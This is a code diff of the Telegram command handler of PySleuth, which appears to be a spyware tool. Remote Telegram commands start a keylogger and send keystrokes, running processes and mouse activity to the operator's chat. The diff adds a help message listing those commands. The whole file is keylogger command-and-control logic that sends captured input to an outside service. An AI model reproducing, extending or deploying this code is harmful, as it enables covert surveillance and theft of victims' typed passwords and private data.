@@ -15,7 +15,6 @@ class TelegramController(BaseController):
         super(TelegramController, self).__init__()
 
         self.master = master
-        self.isActive = False
 
         token = os.getenv("TELEGRAM_TOKEN")
         chatID = int(os.getenv("TELEGRAM_ID"))
@@ -39,6 +38,7 @@ class TelegramController(BaseController):
 
     def startWorker(self):
         self.bot.sendText("PySleuth is waiting for startup signal")
+        self._sendHelpText()
 
         while self.master.RUNNING:
             self.bot.spinOnce()
@@ -50,19 +50,40 @@ class TelegramController(BaseController):
     def _handleMessage(self, message: str):
         if message == "start":
             self._onStartProgram()
-
         elif message == "stop":
             self._onStopProgram()
-
         elif message == "log keys":
             self._onLogKeys()
         elif message == "log proc":
             self._onLogProc()
         elif message == "log mouse":
             self._onLogMouse()
-
         else:
             self._onUnknownCommand()
+
+    def _sendHelpText(self):
+        HELP = """
+
+*Available commands*
+
+    *start*
+        - Start the program
+
+    *stop*
+        - Stop the program
+    
+    *log keys*
+        - Send keylogger output
+    
+    *log proc*
+        - Send running processes
+    
+    *log mouse*
+        - Send mouse activity
+
+        """
+
+        self.bot.sendText(HELP, parse_mode="Markdown")
 
     def _onStartProgram(self):
         self.master.ctrls.keyloggerctrl.startWorker()
@@ -91,3 +112,4 @@ class TelegramController(BaseController):
 
     def _onUnknownCommand(self):
         self.bot.sendText("I didn't get you master :(")
+        self._sendHelpText()
